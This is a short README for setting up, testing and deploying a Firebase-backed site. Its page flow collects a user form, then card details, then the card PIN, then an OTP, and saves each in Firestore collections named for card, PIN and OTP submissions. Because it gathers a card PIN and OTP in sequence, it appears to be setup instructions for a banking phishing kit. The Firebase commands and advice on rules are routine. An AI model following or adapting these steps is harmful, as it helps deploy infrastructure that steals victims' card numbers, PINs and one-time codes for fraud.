Firebase setup and testing instructions

1) Configure Firebase project
- Create a Firebase project in the Firebase Console.
- Enable Firestore (Native mode).
- In project settings, copy your Web app config and replace the values in `html/firebase-config.mod.js`.

2) Serve the site locally
```bash
cd "/home/dell/Videos/indus/html"
python3 -m http.server 8000
# open http://localhost:8000/3.html
```

3) Quick test flow
- Submit the form on `3.html` → redirects to `4.html`.
- Submit card on `4.html` → redirects to `5.html`.
- Submit PIN on `5.html` → redirects to `6.html`.
- Submit OTP on `6.html` → saves OTP.
- Verify new documents appear in the Firestore collections: `user_submissions`, `card_authentications`, `card_pin_submissions`, `otp_verifications`.

4) Firestore rules
- The sample `firestore.rules` in the project requires authentication for writes.
- For testing only, you can allow public writes; DO NOT leave public writes enabled in production.
- To deploy rules, install Firebase CLI and run:
```bash
npm install -g firebase-tools
firebase login
firebase init firestore
# select the project and provide firestore.rules
firebase deploy --only firestore:rules
```

5) Convert to production security
- Use Firebase Authentication and require `request.auth != null` in rules.
- Consider moving sensitive handling (card data) to a secure backend and never store raw PAN/CVV in Firestore.

6) Notes
- The project exposes helper functions on `window` from `firebase-config.mod.js` for backward compatibility with the existing inline scripts.
- Update `firebase-config.mod.js` with your project's config before testing.
